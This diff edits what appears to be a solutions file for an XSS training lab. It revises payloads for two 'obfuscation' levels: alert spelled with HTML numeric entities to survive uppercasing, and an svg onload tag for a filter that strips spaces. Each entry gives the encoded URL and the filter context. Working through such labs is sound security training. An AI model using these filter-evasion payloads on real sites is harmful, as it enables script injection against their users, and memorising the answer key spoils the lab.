@@ -11,10 +11,10 @@ Server-side case/space/char-stripping that fails against case-insensitive HTML o
 
 ### obfuscation-level2
 
-`/obfuscation/level2/?query=%3CIMG%20SRC%3DX%20ONERROR%3DALERT(1)%3E`
+`/obfuscation/level2/?query=%3Cimg%20src=x%20onerror=%26%2397;%26%23108;%26%23101;%26%23114;%26%23116;(1)%3E`
 
-- payload: `<IMG SRC=X ONERROR=ALERT(1)>`
-- context: input uppercased then body reflection; HTML is case-insensitive
+- payload: `<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>`
+- context: input uppercased; JS is case-sensitive, so spell alert with numeric entities
 
 ### obfuscation-level3
 
@@ -25,10 +25,10 @@ Server-side case/space/char-stripping that fails against case-insensitive HTML o
 
 ### obfuscation-level4
 
-`/obfuscation/level4/?query=%3Cimg%2Fsrc%3Dx%2Fonerror%3Dalert(1)%3E`
+`/obfuscation/level4/?query=%3Csvg/onload=alert(1)%3E`
 
-- payload: `<img/src=x/onerror=alert(1)>`
-- context: spaces stripped; use / as attribute separator
+- payload: `<svg/onload=alert(1)>`
+- context: spaces stripped; `/` separates only after the tag name, so use a one-attribute tag
 
 ### obfuscation-level5
 
